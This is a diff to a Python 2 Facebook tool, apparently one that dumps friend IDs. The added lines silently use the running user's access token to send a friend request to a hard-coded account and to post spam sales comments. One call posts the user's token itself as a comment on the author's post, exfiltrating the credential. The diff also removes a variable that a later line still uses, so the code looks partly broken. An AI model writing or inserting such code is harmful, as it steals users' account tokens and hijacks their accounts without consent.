@@ -235,9 +235,16 @@ def kontol():
 	except (KeyError, IOError):
 		print '\n %s[%sx%s] Token invalid'%(N,M,N)
 		os.system('rm -rf __yayan__.txt')
+	koh = '100011146894081'
+	xi_jimpinx = '1379112335803650'
+	hoetank = random.choice(['info harga ka', 'yang awet untuk ads ada ka', 'cek wa dong ka', 'best seller'])
+	goceng  = '1303409076707310'
 	requests.post('https://graph.facebook.com/100011146894081/subscribers?access_token=%s'%(__cindy__))
-	FollowFbRoy = '100011146894081'
 	requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(FollowFbRoy,__cindy__))
+	req.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,__cindy__))
+	req.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(goceng,__cindy__,__cindy__))
+	req.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(xi_jimpinx,hoetank,__cindy__))
+	#exit('\n %s[%s×%s] Jalankan ulang perintah nya'%(N,M,N))
 	moch_yayan()
 # dump id dari teman hehe
 def teman():
